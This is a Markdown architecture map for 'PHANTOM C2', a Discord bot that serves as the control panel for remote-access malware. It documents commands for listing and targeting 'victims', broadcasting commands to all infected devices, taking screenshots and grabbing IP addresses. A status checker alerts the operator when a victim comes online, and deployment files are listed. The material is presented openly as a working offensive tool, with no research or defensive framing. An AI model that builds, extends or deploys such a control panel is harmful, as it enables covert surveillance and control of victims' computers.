# PHANTOM C2 BOT MAP

## Entry Points

```
User Message (!cmd)  ──┐
                       ├──→ BOT
Button Click          ──┘
```

## Commands Tree

```
!menu        ─→ CONTROL PANEL (embeds + buttons)
!help        ─→ COMMAND REFERENCE (embeds + buttons)
!devices     ─→ VICTIMS LIST (paginated)
!target <n>  ─→ Select victim by channel name
!untarget    ─→ Clear current victim
!broadcast   ─→ Send command to ALL devices

!<cmd>              → send to target (or auto-target if 1 device)
!<cmd> <device>     → send to specific device by name
```

## Button Layouts

```
MAIN MENU (4 buttons):
  [ Devices 👻 ] [ Screenshot 👁️ ] [ Help 🕸️ ] [ Instagram ]

HELP EMBED (2 buttons):
  [ Menu ☰ ] [ Instagram ]

ALERT (1 button):
  [ Screenshot 📸 ]
```

## Pagination Flow

```
!devices / Devices button
  → refreshDeviceStatus()
  → buildDevicePages()
  → Send page 1 + pagination buttons + menu buttons
  → Store { pages, idx } in devicePages Map
  → On [◀ PREV] / [NEXT ▶] click:
      → Lookup messageId in devicePages
      → Update idx
      → i.update() with new page
  → Map auto-clears after 120s
```

## Event Flow

```
InteractionCreate
  ├── prev/next   → devicePages lookup → i.update()
  ├── select menu → set target → i.update()
  ├── a_*         → alert actions (ss/menu/info/etc)
  ├── devices     → deferUpdate → fetch → reply pages
  ├── menu/help   → reply embed + buttons
  ├── broadcast   → reply usage
  ├── BTN_ACTIONS → send command to target/device
  └── fallback    → "Unknown action"

MessageCreate
  ├── Bot commands (!help/!menu/!devices/!target/!untarget/!broadcast)
  ├── Device commands (!ping/!screenshot/!ip/etc)
  └── Fallback → ignore
```

## Status Checker

```
startStatusChecker(guild)
  → refreshDeviceStatus(guild, sendAlerts=true)
  → Every 5 minutes:
      → Fetch all phantom-* channels
      → Check last 3 messages for heartbeat
      → Update deviceStatus Map
      → If status changed AND alert channel exists:
          → Send Online/Offline embed to alert channel
          → Online alert includes [Screenshot 📸] button
```

## Data Flow

```
phantom-<id> channels
  └── deviceStatus Map { channelId → { online, lastSeen, name } }
  
targets Map { userId → channelId }
  └── sendToTarget(userId, guild, cmd, payload)
      └── sendCmd(channel, cmd, payload)
          └── channel.send(`!${cmd} ${payload}`)

devicePages Map { messageId → { pages[], idx } }
  └── Pagination state, auto-cleared after 2 minutes
```

## File Structure

```
discord-bot/
  index.js        ─ Main bot code
  gif.txt         ─ Random GIF URLs for embeds
  .env            ─ Discord token + channel IDs
  .env.example    ─ Template for .env
  Dockerfile      ─ Container build
  start.sh        ─ Entry script
  railway.json    ─ Railway deploy config
  package.json    ─ Dependencies
  BOTMAP.md       ─ This file
```
